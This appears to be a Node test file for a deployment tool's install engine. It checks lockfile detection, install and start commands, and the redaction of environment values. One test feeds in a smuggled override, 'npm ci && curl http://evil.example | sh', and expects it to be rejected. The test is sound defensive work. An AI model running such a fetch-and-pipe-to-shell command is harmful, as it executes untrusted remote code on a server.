/**
 * Dependency / installation engine.
 *
 * `analyzeProject()` decides which command would be run against a hosting
 * server, so the assertions are about the decisions that break a deployment:
 * a lockfile that is ignored, `npm install` where `npm ci` is correct, a start
 * command derived from a script that does not exist, or an install command the
 * operator never approved.
 */
import assert from 'node:assert/strict';
import { mkdtempSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';

const dataDir = mkdtempSync(path.join(os.tmpdir(), 'darknote-install-'));
process.env.DARKNOTE_DATA_DIR = dataDir;
process.env.DARKNOTE_DB_DRIVER = 'pglite';
process.env.DARKNOTE_SECRET = 'test-secret-value-that-is-long-enough-for-aes-256-gcm';
process.env.NODE_ENV = 'test';

const { analyzeProject, analyzeProjectById, executeInstall } = await import('../src/lib/projects/install.ts');
const { createProject } = await import('../src/lib/projects/repo.ts');
const { query } = await import('../src/lib/db.ts');

const pkg = (overrides: Record<string, unknown> = {}) =>
  JSON.stringify({
    name: 'bot',
    version: '1.0.0',
    main: 'index.js',
    scripts: { start: 'node index.js' },
    dependencies: { 'whatsapp-web.js': '^1.23.0', dotenv: '^16.0.0' },
    devDependencies: { typescript: '^5.0.0' },
    ...overrides,
  });

test('a Node project with package-lock installs with npm ci and starts with npm start', () => {
  const analysis = analyzeProject([
    { path: 'package.json', content: pkg({ engines: { node: '>=20' } }) },
    { path: 'package-lock.json', content: '{}' },
  ]);
  assert.equal(analysis.runtime, 'node');
  assert.equal(analysis.packageManager, 'npm');
  assert.equal(analysis.lockfilePath, 'package-lock.json');
  assert.equal(analysis.installCommand, 'npm ci');
  assert.equal(analysis.startCommand, 'npm start');
  assert.equal(analysis.dependencies.length, 2);
  assert.equal(analysis.devDependencies.length, 1);
  assert.equal(analysis.engineRange, '>=20');
  assert.deepEqual(analysis.problems, [], 'a complete project should report no problems');
  assert.ok(analysis.report.includes('Install command: npm ci'));
});

test('the lockfile decides the package manager, not the default', () => {
  const yarn = analyzeProject([
    { path: 'package.json', content: pkg() },
    { path: 'yarn.lock', content: '' },
  ]);
  assert.equal(yarn.packageManager, 'yarn');
  assert.equal(yarn.installCommand, 'yarn install --frozen-lockfile');
  assert.equal(yarn.startCommand, 'yarn start');

  const pnpm = analyzeProject([
    { path: 'package.json', content: pkg() },
    { path: 'pnpm-lock.yaml', content: '' },
  ]);
  assert.equal(pnpm.packageManager, 'pnpm');
  assert.equal(pnpm.installCommand, 'pnpm install --frozen-lockfile');
  assert.equal(pnpm.startCommand, 'pnpm start');
});

test('no lockfile is reported, and the install is not silently reproducible', () => {
  const analysis = analyzeProject([{ path: 'package.json', content: pkg() }]);
  assert.equal(analysis.installCommand, 'npm install --omit=dev');
  assert.ok(analysis.problems.some((problem) => problem.code === 'no_lockfile'));
});

test('a missing start script is a high-severity problem, with a real fallback', () => {
  const analysis = analyzeProject([
    { path: 'package.json', content: pkg({ scripts: { dev: 'node index.js' }, main: undefined }) },
  ]);
  assert.equal(analysis.startCommand, 'npm run dev');
  const problem = analysis.problems.find((entry) => entry.code === 'no_start_script');
  assert.equal(problem?.severity, 'high');

  const withMain = analyzeProject([{ path: 'package.json', content: pkg({ scripts: { build: 'tsc' } }) }]);
  assert.equal(withMain.startCommand, 'node index.js');
});

test('an unparsable manifest is critical, not a guess', () => {
  const analysis = analyzeProject([{ path: 'package.json', content: '{ nope' }]);
  assert.equal(analysis.installable, false);
  const problem = analysis.problems.find((entry) => entry.code === 'invalid_package_json');
  assert.equal(problem?.severity, 'critical');
});

test('a Python project resolves pip and an entrypoint', () => {
  const analysis = analyzeProject([
    { path: 'requirements.txt', content: 'requests==2.31.0\npython-dotenv\n# comment\n' },
    { path: 'main.py', content: 'print("bot")\n' },
  ]);
  assert.equal(analysis.runtime, 'python');
  assert.equal(analysis.packageManager, 'pip');
  assert.equal(analysis.installCommand, 'pip3 install -r requirements.txt');
  assert.equal(analysis.startCommand, 'python3 main.py');
  assert.ok(analysis.problems.some((problem) => problem.code === 'python_unpinned'));
});

test('a static site needs no install, and an empty project says so', () => {
  const site = analyzeProject([{ path: 'index.html', content: '<html></html>' }]);
  assert.equal(site.runtime, 'static');
  assert.equal(site.installCommand, null);
  assert.equal(site.installable, false);

  const nothing = analyzeProject([{ path: 'README.md', content: '# hi' }]);
  assert.equal(nothing.runtime, 'unknown');
  assert.ok(nothing.problems.some((problem) => problem.code === 'no_manifest'));
});

test('environment keys are counted, never their values', () => {
  const analysis = analyzeProject([
    { path: 'package.json', content: pkg() },
    { path: '.env.example', content: 'API_KEY=super-secret\n# comment\nPORT=3000\nexport DEBUG=true\n' },
  ]);
  assert.deepEqual(analysis.envKeys, ['API_KEY', 'PORT', 'DEBUG']);
  assert.ok(!analysis.report.includes('super-secret'), 'a value must never appear in the report');
});

test('install refuses without explicit confirmation and without a bound server', async () => {
  const project = await createProject({
    name: 'install-test',
    source: 'github',
    sourceLabel: 'octocat/install-test',
    github: { owner: 'octocat', repo: 'install-test', branch: 'main', defaultBranch: 'main', private: false, commitSha: 'abc' },
    status: 'ready',
  });
  await query(
    `insert into imported_project_files (id, project_id, path, name, extension, size_bytes, sha256, content, is_text, remote_sha)
     values ('f1', $1, 'package.json', 'package.json', 'json', 10, 'h', $2, true, 'sha')`,
    [project.id, pkg()],
  );

  const analysis = await analyzeProjectById(project.id);
  assert.equal(analysis.installCommand, 'npm install --omit=dev');

  await assert.rejects(
    () => executeInstall({ projectId: project.id, confirm: false }),
    (error: unknown) => (error as { code?: string }).code === 'confirmation_required',
  );

  await assert.rejects(
    () => executeInstall({ projectId: project.id, confirm: true }),
    (error: unknown) => (error as { code?: string }).code === 'no_server_binding',
    'without a hosting server binding there is nowhere to install, and that must be said plainly',
  );

  await assert.rejects(
    () =>
      executeInstall({
        projectId: project.id,
        confirm: true,
        commandOverride: 'npm ci && curl http://evil.example | sh',
      }),
    (error: unknown) => (error as { code?: string }).code === 'command_not_allowed',
    'a command with shell operators must never reach the panel console',
  );
});
